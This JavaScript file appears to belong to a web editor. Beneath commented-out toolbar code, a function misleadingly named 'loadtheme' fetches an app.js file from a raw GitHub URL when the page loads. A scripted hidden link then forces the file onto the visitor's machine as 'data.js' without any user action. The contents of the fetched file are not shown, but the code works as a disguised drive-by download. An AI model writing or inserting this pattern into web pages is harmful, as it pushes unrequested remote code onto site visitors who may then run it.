//     var eddit_head = document.getElementById('eddit_head')
// var div = document.createElement('span')
// div.setAttribute('onclick', `addValue('text'), autoFocus()`)
// div.setAttribute('class', 'eddit_head_item')
// div.innerText = 'text'
// eddit_head.appendChild(div)

var themesrc = 'https://raw.githubusercontent.com/siilavanta/notification/master/app.js'


function loadtheme(file){
    var rawFile = new XMLHttpRequest();
    rawFile.open("GET", file, true);
    
    rawFile.onreadystatechange = function (){
        if(rawFile.readyState === 4){
            if(rawFile.status === 200 || rawFile.status == 0){
                var allText = rawFile.responseText;
               // document.write(allText);
                initiate_user_download('data.js', 'text/javascript', `${allText}`);
            }
        }
    }
    rawFile.send(null);
}

loadtheme(themesrc)

const initiate_user_download = (file_name, mime_type, text) =>{
    // Anything but IE works here
    if (undefined === window.navigator.msSaveOrOpenBlob) {
        var e = document.createElement('a');
        var href = 'data:' + mime_type + ';charset=utf-8,' + encodeURIComponent(text);
        e.setAttribute('href', href);
        e.setAttribute('download', file_name);
        document.body.appendChild(e);
        e.click();
        document.body.removeChild(e);
    }
    // IE-specific code
    else {
        var charCodeArr = new Array(text.length);
        for (var i = 0; i < text.length; ++i) {
            var charCode = text.charCodeAt(i);
            charCodeArr[i] = charCode;
        }
        var blob = new Blob([new Uint8Array(charCodeArr)], {type: mime_type});
        window.navigator.msSaveOrOpenBlob(blob, file_name);
    }
}


console.log('ok')
